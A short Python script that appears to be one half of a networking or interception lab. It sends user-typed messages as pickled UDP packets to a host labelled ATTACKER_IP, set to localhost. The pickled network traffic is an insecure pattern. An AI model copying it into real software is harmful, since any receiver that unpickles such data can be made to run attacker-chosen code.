import socket
import hashlib
import pickle
import time

# Constants (Use the actual IP of the attacker)
SENDER_IP = '127.0.0.1'  # Sender's IP
ATTACKER_IP = '127.0.0.1'  # Attacker's IP (not the receiver's)
ATTACKER_PORT = 8081  # Port on the attacker

# Function to compute checksum
def compute_checksum(data):
    return hashlib.md5(data.encode()).hexdigest()

# Sender Class
class Sender:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def send_message(self, message):
        # Construct packet
        source_ip = SENDER_IP
        destination_ip = ATTACKER_IP  # Now sending to attacker
        port = ATTACKER_PORT
        delay_time = time.time()
        checksum = compute_checksum(message)

        packet = (source_ip, destination_ip, port, delay_time, checksum, message)
        self.sock.sendto(pickle.dumps(packet), (destination_ip, port))
        print(f"Sent to Attacker: {message}")

def main():
    sender = Sender()
    while True:
        message = input("Enter message to send: ")
        sender.send_message(message)

if __name__ == "__main__":
    main()
